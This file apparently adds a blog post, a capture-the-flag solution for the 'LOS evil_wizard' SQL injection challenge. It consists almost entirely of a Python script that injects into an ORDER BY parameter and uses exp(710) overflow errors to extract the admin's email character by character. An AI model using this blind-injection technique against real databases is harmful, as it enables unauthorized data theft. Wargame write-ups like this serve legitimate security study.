@@ -1,0 +1,27 @@
+---
+title: "LOS evil_wizard"
+date: 2020-08-16
+tag: [pwnable]
+layout: post
+part: WEB
+---
+
+{% highlight python %}
+import requests
+
+url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
+cookies = {"PHPSESSID":"bv8d8pvo9ru17v8ptnctgbnus7"}
+# for i in range(100):
+#     params={"order":"1, (select exp(710) where id='admin' and length(email)={})".format(str(i))}
+#     r = requests.get(url=url,cookies=cookies,params=params)
+#     if "<td>admin</td>" not in r.text:
+#         print(i)
+#         break
+for j in range(30):
+    for i in range(32,127):
+        params={"order":"1, (select exp(710) where id='admin' and ascii(substr(email,{},1))={})".format(str(j+1),str(i))}
+        r = requests.get(url=url,cookies=cookies,params=params)
+        if "<td>admin</td>" not in r.text:
+            print(chr(i))
+            break
+{% endhighlight %}
